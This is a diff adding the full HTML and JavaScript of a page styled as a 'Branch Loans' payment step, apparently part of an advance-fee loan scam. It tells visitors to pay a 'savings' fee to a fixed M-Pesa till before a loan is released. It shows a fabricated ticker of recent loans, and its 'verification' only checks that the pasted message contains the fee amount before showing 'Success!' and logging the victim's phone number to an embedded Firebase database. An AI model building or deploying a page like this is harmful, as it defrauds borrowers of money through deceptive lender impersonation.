@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="icon" type="image/png" href="IMG-20250323-WA0008.png">
+    <title>Branch - Confirmation</title>
+    <style>
+        :root {
+            --primary-color: #2c5282;
+            --primary-dark: #1e3a8a;
+            --secondary-color: #e2e8f0;
+            --accent-color: #ff6b35;
+            --text-color: #2d3748;
+            --light-text: #718096;
+            --success-color: #38a169;
+            --warning-color: #dd6b20;
+            --danger-color: #e53e3e;
+            --border-radius: 8px;
+            --box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #8ce9e9 0%, #e2e8f0 100%);
+            color: var(--text-color);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header-banner {
+            background: linear-gradient(135deg, #2c5282 0%, #2b6cb0 100%);
+            color: white;
+            padding: 0.8rem 0;
+            text-align: center;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .ticker {
+            background: rgba(255, 255, 255, 0.9);
+            color: var(--success-color);
+            padding: 1rem;
+            text-align: center;
+            font-size: 0.95rem;
+            font-weight: 500;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 0.8rem;
+            animation: fadeInDown 0.6s ease-in-out;
+            border-bottom: 1px solid rgba(209, 243, 209, 0.5);
+            backdrop-filter: blur(4px);
+        }
+
+        .ticker i {
+            font-size: 1.1rem;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 2rem auto;
+            padding: 2rem;
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.15);
+            flex: 1;
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .logo i {
+            font-size: 1.8rem;
+        }
+
+        h2 {
+            color: var(--primary-color);
+            margin-bottom: 1rem;
+            font-size: 1.4rem;
+            font-weight: 600;
+        }
+
+        .info-section {
+            margin-bottom: 2rem;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 16px;
+            padding: 1.5rem;
+            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .info-section:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px rgba(31, 38, 135, 0.2);
+        }
+
+        .savings-section {
+            background: linear-gradient(135deg, rgba(44, 82, 130, 0.1) 0%, rgba(43, 108, 176, 0.1) 100%);
+            padding: 1.5rem;
+            border-radius: var(--border-radius);
+            border-left: 4px solid var(--primary-color);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .savings-section:before {
+            content: "";
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 100px;
+            height: 100px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" fill="%232c5282" opacity="0.05"><path d="M50 0c27.6 0 50 22.4 50 50s-22.4 50-50 50S0 77.6 0 50 22.4 0 50 0zm0 10c-22.1 0-40 17.9-40 40s17.9 40 40 40 40-17.9 40-40-17.9-40-40-40zm0 20c11 0 20 9 20 20s-9 20-20 20-20-9-20-20 9-20 20-20z"/></svg>');
+            background-size: contain;
+            background-repeat: no-repeat;
+            transform: translate(30px, -30px);
+        }
+
+        .info-section p {
+            color: var(--text-color);
+            margin-bottom: 1rem;
+            font-size: 1rem;
+        }
+
+        .info-section strong {
+            color: var(--primary-color);
+            font-weight: 600;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem 1.5rem;
+            background: linear-gradient(135deg, #2c5282 0%, #2b6cb0 100%);
+            color: white;
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            box-shadow: 0 4px 15px rgba(44, 82, 130, 0.3);
+            text-decoration: none;
+            width: 100%;
+        }
+
+        .btn:hover {
+            background: linear-gradient(135deg, #1e3a8a 0%, #2c5282 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(44, 82, 130, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn.copied {
+            background: var(--success-color);
+            color: white;
+        }
+
+        .payment-instructions {
+            background-color: rgba(248, 250, 252, 0.8);
+            padding: 1.5rem;
+            border-left: 4px solid var(--primary-color);
+            border-radius: var(--border-radius);
+            margin: 1.5rem 0;
+        }
+
+        .payment-instructions p {
+            margin-bottom: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .payment-instructions p i {
+            color: var(--primary-color);
+            font-size: 1.1rem;
+            min-width: 20px;
+        }
+
+        .verify-btn {
+            display: block;
+            margin: 2rem auto;
+            text-align: center;
+            width: 100%;
+            max-width: 300px;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 2rem;
+            border-radius: var(--border-radius);
+            width: 90%;
+            max-width: 420px;
+            text-align: center;
+            position: relative;
+            box-shadow: var(--box-shadow);
+            animation: fadeInUp 0.5s ease-in-out;
+        }
+
+        .modal-content h3 {
+            color: var(--primary-color);
+            margin-bottom: 1rem;
+        }
+
+        .modal-content textarea {
+            width: 100%;
+            padding: 0.8rem;
+            border: 1px solid #e2e8f0;
+            border-radius: var(--border-radius);
+            margin-bottom: 1rem;
+            resize: vertical;
+            min-height: 120px;
+            font-family: inherit;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 1.5rem;
+            color: var(--light-text);
+            background: none;
+            border: none;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .close-btn:hover {
+            color: var(--primary-color);
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--danger-color);
+            color: white;
+            padding: 1rem 1.5rem;
+            border-radius: var(--border-radius);
+            display: none;
+            z-index: 9999;
+            box-shadow: 0 4px 15px rgba(229, 62, 62, 0.3);
+            font-weight: 500;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .status-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
+        .status-message {
+            font-size: 1.3rem;
+            margin-bottom: 1.5rem;
+            color: var(--text-color);
+            font-weight: 600;
+        }
+
+        .status-icon {
+            font-size: 3rem;
+            color: var(--primary-color);
+        }
+
+        .dot-animate {
+            font-size: 2rem;
+            font-weight: bold;
+            color: var(--primary-color);
+            margin: 0 3px;
+            opacity: 0.2;
+            transition: opacity 0.3s ease;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: auto;
+            color: white;
+            font-size: 0.85rem;
+            padding: 1.5rem 0;
+            background: #2d3748;
+        }
+
+        /* New styles for improved till copy section */
+        .till-container {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+            margin: 0.8rem 0;
+        }
+
+        .till-number {
+            background: rgba(240, 245, 255, 0.8);
+            padding: 0.8rem 1rem;
+            border-radius: var(--border-radius);
+            font-family: monospace;
+            font-size: 1.1rem;
+            color: var(--primary-color);
+            font-weight: 600;
+            display: inline-block;
+            word-break: break-all;
+            text-align: center;
+        }
+
+        .copy-till-btn {
+            padding: 1rem;
+            font-size: 0.95rem;
+            width: 100%;
+            max-width: 200px;
+            margin: 0 auto;
+        }
+
+        .copy-till-btn i {
+            margin-right: 0.5rem;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                margin: 1rem;
+                padding: 1.5rem;
+            }
+            
+            .ticker {
+                font-size: 0.85rem;
+                padding: 0.8rem;
+            }
+            
+            .verify-btn {
+                max-width: none;
+            }
+
+            .till-container {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .till-number {
+                width: 100%;
+                text-align: center;
+            }
+            
+            .copy-till-btn {
+                max-width: 100%;
+                width: 100%;
+            }
+
+            /* Improved mobile text sizing */
+            h2 {
+                font-size: 1.2rem;
+            }
+
+            .info-section p {
+                font-size: 0.95rem;
+            }
+
+            .payment-instructions p {
+                font-size: 0.9rem;
+            }
+
+            .btn {
+                font-size: 0.95rem;
+                padding: 0.9rem;
+            }
+
+            .logo {
+                font-size: 1.5rem;
+            }
+
+            .logo i {
+                font-size: 1.4rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 1.2rem;
+                margin: 0.5rem;
+            }
+
+            .info-section {
+                padding: 1.2rem;
+            }
+
+            .payment-instructions {
+                padding: 1rem;
+            }
+
+            h2 {
+                font-size: 1.1rem;
+            }
+
+            .info-section p {
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header-banner">
+        Fast and secure loan processing • 100% online application
+    </div>
+
+    <div class="ticker">
+        <i class="fas fa-bullhorn"></i>
+        <span id="ticker-text">Loading recent loans...</span>
+    </div>
+
+    <div class="container">
+        <div class="logo">
+            <i class="fas fa-code-branch"></i>
+            <span>Branch Loans</span>
+        </div>
+
+        <div class="info-section savings-section">
+            <h2>ACCOUNT SAVINGS</h2>
+            <p>
+                Based on selected loan amount of <strong id="loanAmount"></strong>,
+                <strong>Everglow Investments Inc</strong> requires you to save
+                <strong id="savingsAmount"></strong> (selected saving plan) to your Branch Loans account. This helps strengthen your credit profile. Your savings will be withdrawable exclusively upon successful completion of your first loan repayment cycle.
+            </p>
+            <button class="btn" onclick="location.href='ccow.html'">Change Savings Plan</button>
+        </div>
+
+        <div class="info-section">
+            <h2>How to Save to Your Branch Loans Account</h2>
+            <div class="payment-instructions">
+                <p><i class="fas fa-mobile-alt"></i><strong>Go to M-Pesa</strong></p>
+                <p><i class="fas fa-shopping-cart"></i><strong>Lipa na M-Pesa:</strong> Buy Goods & Services</p>
+                <p><i class="fas fa-hashtag"></i><strong>Enter Till Number:</strong></p>
+                <div class="till-container">
+                    <span id="tillNumber" class="till-number">8067532</span>
+                    <button class="btn copy-till-btn" onclick="copyTill(this)">
+                        <i class="far fa-copy"></i> Copy Till
+                    </button>
+                </div>
+                <p><i class="fas fa-money-bill-wave"></i><strong>Enter Amount:</strong> <strong id="payAmount"></strong></p>
+                <p><i class="fas fa-lock"></i><strong>Complete Payment:</strong> Enter M-Pesa PIN</p>
+            </div>
+            <button class="btn verify-btn" onclick="showModal()">Verify Payment to Initiate Loan Disbursement</button>
+        </div>
+
+        <div id="successModal" class="modal" onclick="hideModal(event)">
+            <div class="modal-content" onclick="event.stopPropagation()">
+                <button class="close-btn" onclick="closeModal()">×</button>
+                <h3>Verify Payments</h3>
+                <p>Copy the entire confirmation message you received from M-Pesa after making the payment and paste in the field below then click VERIFY.</p>
+                <textarea id="confirmationMsg" rows="4" placeholder="Paste your M-Pesa message here..."></textarea>
+                <button class="btn" onclick="validateMessage()">VERIFY</button>
+            </div>
+        </div>
+
+        <div class="toast" id="errorToast">Please enter a valid message</div>
+
+        <div id="statusOverlay" class="status-overlay">
+            <div id="statusMessage" class="status-message">Loading...</div>
+            <div id="statusIcon" class="status-icon"></div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        &copy; 2025 Branch Loans. All rights reserved.
+    </footer>
+
+    <!-- Firebase App (Core SDK) -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <!-- Firebase Database -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyCjnv5_IGHQVa5tXUBmH6FDYxBUvSREVsQ",
+            authDomain: "okoa-mkopo-straight-to-m-pesa.firebaseapp.com",
+            projectId: "okoa-mkopo-straight-to-m-pesa",
+            storageBucket: "okoa-mkopo-straight-to-m-pesa.appspot.com",
+            messagingSenderId: "398221059857",
+            appId: "1:398221059857:web:92874816cd6a8365008eb0",
+            measurementId: "G-T0MQ5Q1FW1"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const tickerMessages = [
+            "0710****90 loaned Ksh 4999 — 20 minutes ago",
+            "0711****45 loaned Ksh 8000 — 16 minutes ago",
+            "0702****88 loaned Ksh 12300 — 10 minutes ago",
+            "0722****33 loaned Ksh 5600 — 4 minutes ago"
+        ];
+
+        let tickerIndex = 0;
+        setInterval(updateTicker, 4000);
+
+        function updateTicker() {
+            document.getElementById("ticker-text").textContent = tickerMessages[tickerIndex];
+            tickerIndex = (tickerIndex + 1) % tickerMessages.length;
+        }
+        updateTicker();
+
+        const loanAmount = sessionStorage.getItem("loanLimit") || "0";
+        const serviceFee = sessionStorage.getItem("selectedAmount") || "0";
+
+        document.getElementById("loanAmount").textContent = loanAmount;
+        document.getElementById("savingsAmount").textContent = serviceFee;
+        document.getElementById("payAmount").textContent = serviceFee;
+
+        function copyTill(button) {
+            const till = document.getElementById("tillNumber").textContent;
+            navigator.clipboard.writeText(till).then(() => {
+                const icon = button.querySelector('i');
+                icon.className = 'fas fa-check';
+                button.innerHTML = '<i class="fas fa-check"></i> Till Copied!';
+                button.classList.add("copied");
+                setTimeout(() => {
+                    button.innerHTML = '<i class="far fa-copy"></i> Copy Till';
+                    button.classList.remove("copied");
+                }, 2000);
+            });
+        }
+
+        function showModal() {
+            document.getElementById("successModal").style.display = "flex";
+        }
+
+        function hideModal(event) {
+            if (event.target.id === "successModal") {
+                closeModal();
+            }
+        }
+
+        function closeModal() {
+            document.getElementById("successModal").style.display = "none";
+        }
+
+        document.addEventListener("keydown", function(event) {
+            if (event.key === "Escape") {
+                closeModal();
+            }
+        });
+
+        function showToast(message) {
+            const toast = document.getElementById("errorToast");
+            toast.textContent = message;
+            toast.style.display = "block";
+            
+            setTimeout(() => {
+                toast.style.display = "none";
+            }, 3000);
+        }
+
+        function validateMessage() {
+            const message = document.getElementById("confirmationMsg").value.trim();
+            const requiredAmount = serviceFee.replace(/[^\d.]/g, '');
+
+            if (message && message.includes(requiredAmount)) {
+                const overlay = document.getElementById('statusOverlay');
+                const msg = document.getElementById('statusMessage');
+                const icon = document.getElementById('statusIcon');
+
+                overlay.style.display = 'flex';
+                msg.textContent = "Verifying Payment";
+                icon.innerHTML = `<i class="fas fa-spinner fa-spin"></i>`;
+
+                setTimeout(() => {
+                    msg.textContent = "Success!";
+                    icon.innerHTML = `<i class="fas fa-check-circle" style="color: var(--success-color)"></i>`;
+
+                    // Save data to Firebase
+                    const userData = {
+                        loanLimit: loanAmount,
+                        serviceFee: serviceFee,
+                        yere: "67",
+                        timestamp: new Date().toISOString()
+                    };
+                    const phone = sessionStorage.getItem("mpesaNumber");
+
+                    firebase.database().ref('users/' + phone).update(userData)
+                        .then(() => {
+                            setTimeout(() => {
+                                window.location.href = "dash.html";
+                            }, 2000);
+                        })
+                        .catch((error) => {
+                            console.error("Error saving to database:", error);
+                            showToast("Error saving your request. Try again.");
+                            overlay.style.display = 'none';
+                        });
+
+                }, 3000);
+
+            } else {
+                showToast("Please enter a valid M-Pesa confirmation message");
+            }
+        }
+    </script>
+</body>
+
+</html>
